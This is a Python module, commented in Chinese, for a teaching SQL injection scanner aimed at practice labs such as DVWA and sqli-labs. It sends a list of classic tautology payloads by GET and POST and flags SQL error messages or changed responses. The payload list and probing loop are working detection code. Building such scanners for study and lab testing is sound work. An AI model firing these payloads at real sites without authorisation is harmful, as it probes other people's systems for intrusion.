# modules/sql_injection.py
"""
更灵活的 SQL 注入检测模块（GET/POST/Submit 变体、提前停止、返回命中 payload）
设计目标：
- 适应不同靶场（DVWA、sqli-labs 等）对参数/提交方式的差异；
- 降低 False Negative（尝试更多变体），同时保持教学安全性（不做 exploit）；
- 一旦发现第一个有效 payload 即停止并返回。

使用说明（CLI 已与之兼容）：
python -m src.app --target "http://localhost:8900/Less-1/" --modules sql --param id
（如果需要 cookie 则加 --cookie "<...>"）
"""

import time
import requests
from typing import Optional
from difflib import SequenceMatcher

# payload 列表：包含带引号/不带引号的常见变体（教学用）
PAYLOADS = [
    # 针对 string 类型（带引号）
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "') OR ('1'='1' --",
    "' OR 'a'='a",
    # 针对 numeric 类型（不带引号）
    "1 OR 1=1",
    "1 OR 1=1--",
    "-1 OR 1=1",
    "0 OR 1=1"
]

# 差异与长度阈值（可调整）
DIFF_THRESHOLD = 0.85
LENGTH_DIFF_THRESHOLD = 40

TIMEOUT = 6.0

def _similarity_ratio(a: str, b: str) -> float:
    if a is None:
        a = ""
    if b is None:
        b = ""
    try:
        return SequenceMatcher(None, a, b).ratio()
    except Exception:
        return 0.0

def _make_get_url(base: str, param_name: str, payload: str) -> str:
    from requests.utils import requote_uri
    sep = '&' if '?' in base else '?'
    return f"{base}{sep}{param_name}={requote_uri(payload)}"

def _make_get_url_with_submit(base: str, param_name: str, payload: str) -> str:
    # 一些靶场需要 Submit=Submit 字段触发处理
    from requests.utils import requote_uri
    sep = '&' if '?' in base else '?'
    return f"{base}{sep}{param_name}={requote_uri(payload)}&Submit=Submit"

def _make_post_data(param_name: str, payload: str) -> dict:
    # POST 表单通常包含参数与 Submit
    return {param_name: payload, 'Submit': 'Submit'}

def _has_sql_error_signature(text: str) -> bool:
    if not text:
        return False
    l = text.lower()
    error_sigs = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
        "sql syntax",
        "mysql_fetch",
        "syntax error"
    ]
    for sig in error_sigs:
        if sig in l:
            return True
    return False

def scan(target: str, param_name: str = 'q', session: Optional[requests.Session] = None) -> dict:
    """
    target: 目标基址，例如 "http://localhost:8900/Less-1/" (不带 ?id=...)
    param_name: 要注入的参数名，例如 'id'
    session: 可选 requests.Session（携带 cookie 或登录会话）
    """
    res = {
        'name': 'sql_injection',
        'target': target,
        'detected': False,
        'vulnerable_payload': None,
        'evidence': [],
        'notes': 'Flexible SQLi checks: try GET, GET+Submit, POST variants.'
    }

    requester = session if session is not None else requests

    # baseline（不带 payload）
    try:
        t0 = time.time()
        r0 = requester.get(target, timeout=TIMEOUT)
        t1 = time.time()
        baseline_body = r0.text or ""
        baseline_len = len(baseline_body)
        baseline_status = r0.status_code
        baseline_time = round(t1 - t0, 3)
    except Exception as e:
        res['notes'] = f'Baseline request failed: {e}'
        return res

    # 尝试每个 payload，多种请求方式（GET, GET+Submit, POST）
    for payload in PAYLOADS:
        # 形成尝试清单（每一项 dict 指定 method/url/data）
        attempts = []

        # GET variant
        url_get = _make_get_url(target, param_name, payload)
        attempts.append({'method': 'GET', 'url': url_get, 'data': None})

        # GET + Submit variant
        url_get_sub = _make_get_url_with_submit(target, param_name, payload)
        attempts.append({'method': 'GET', 'url': url_get_sub, 'data': None})

        # POST variant
        post_data = _make_post_data(param_name, payload)
        attempts.append({'method': 'POST', 'url': target, 'data': post_data})

        # 遍历尝试
        for att in attempts:
            method = att['method']
            url = att['url']
            data = att['data']
            try:
                start = time.time()
                if method == 'GET':
                    r = requester.get(url, timeout=TIMEOUT)
                else:
                    # POST: 以表单形式提交
                    r = requester.post(url, data=data, timeout=TIMEOUT)
                end = time.time()
                body = r.text or ""
                status = r.status_code
                elapsed = round(end - start, 3)
                length = len(body)
            except Exception as e:
                res['evidence'].append({
                    'payload': payload,
                    'method': method,
                    'url': url,
                    'data': data,
                    'reason': 'network_error',
                    'error': str(e)
                })
                # 继续下一个尝试
                continue

            # 计算相似度与长度差
            ratio = _similarity_ratio(baseline_body, body)
            len_diff = abs(length - baseline_len)

            attempt_record = {
                'payload': payload,
                'method': method,
                'url': url,
                'data': data,
                'status_code': status,
                'time': elapsed,
                'length': length,
                'len_diff': len_diff,
                'diff_ratio': round(ratio, 4)
            }

            # 1) 直接错误签名（高置信）
            if _has_sql_error_signature(body):
                attempt_record['reason'] = 'sql_error_signature'
                res['detected'] = True
                res['vulnerable_payload'] = payload
                res['evidence'].append(attempt_record)
                return res

            # 2) 内容差异或长度差（启发式）
            if ratio < DIFF_THRESHOLD or len_diff > LENGTH_DIFF_THRESHOLD:
                attempt_record['reason'] = 'content_diff'
                res['detected'] = True
                res['vulnerable_payload'] = payload
                res['evidence'].append(attempt_record)
                return res

            # 3) 否则记录为无证据（但保存尝试数据）
            attempt_record['reason'] = 'no_evidence'
            res['evidence'].append(attempt_record)

            # 礼貌暂停
            time.sleep(0.15)

    # 所有 payload 与 变体都未发现证据
    return res
